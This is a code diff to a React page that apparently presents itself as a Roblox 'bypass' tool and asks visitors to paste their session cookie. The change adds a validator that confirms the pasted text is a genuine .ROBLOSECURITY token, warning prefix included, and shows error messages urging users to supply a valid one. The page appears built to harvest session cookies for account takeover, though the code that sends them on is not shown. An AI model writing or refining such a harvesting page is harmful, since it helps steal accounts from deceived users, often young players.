@@ -11,10 +11,39 @@ export default function Home() {
   const [progress, setProgress] = useState(0)
   const [username, setUsername] = useState("")
   const [statusText, setStatusText] = useState("")
+  const [error, setError] = useState("")
+
+  const isValidRobloxCookie = (cookieValue: string): boolean => {
+    const trimmedCookie = cookieValue.trim()
+
+    if (!trimmedCookie) return false
+
+    const hasWarningPrefix = trimmedCookie.includes("_|WARNING:-DO-NOT-SHARE-THIS")
+    const cookiePattern = /^[A-Za-z0-9_\-+=.]{100,}$/
+
+    if (hasWarningPrefix) {
+      const parts = trimmedCookie.split("|_")
+      if (parts.length >= 2) {
+        const actualCookie = parts[parts.length - 1]
+        return cookiePattern.test(actualCookie)
+      }
+    }
+
+    return cookiePattern.test(trimmedCookie)
+  }
 
   const handleBypass = async () => {
-    if (!cookie.trim()) return
+    if (!cookie.trim()) {
+      setError("Please enter a cookie")
+      return
+    }
 
+    if (!isValidRobloxCookie(cookie)) {
+      setError("Invalid Roblox cookie format. Please enter a valid .ROBLOSECURITY cookie.")
+      return
+    }
+
+    setError("")
     setIsProcessing(true)
     setProgress(0)
     setUsername("")
@@ -87,10 +116,19 @@ export default function Home() {
 
           <textarea
             value={cookie}
-            onChange={(e) => setCookie(e.target.value)}
+            onChange={(e) => {
+              setCookie(e.target.value)
+              setError("")
+            }}
             placeholder="Paste your cookie here..."
-            className="w-full h-24 px-4 py-3 bg-zinc-950 border border-zinc-800 rounded-lg text-white placeholder:text-zinc-600 focus:outline-none focus:ring-2 focus:ring-zinc-700 resize-none mb-6"
+            className="w-full h-24 px-4 py-3 bg-zinc-950 border border-zinc-800 rounded-lg text-white placeholder:text-zinc-600 focus:outline-none focus:ring-2 focus:ring-zinc-700 resize-none mb-2"
           />
+
+          {error && (
+            <div className="mb-4 p-3 bg-red-950/50 border border-red-900 rounded-lg">
+              <p className="text-red-400 text-sm">{error}</p>
+            </div>
+          )}
 
           <Button
             onClick={handleBypass}
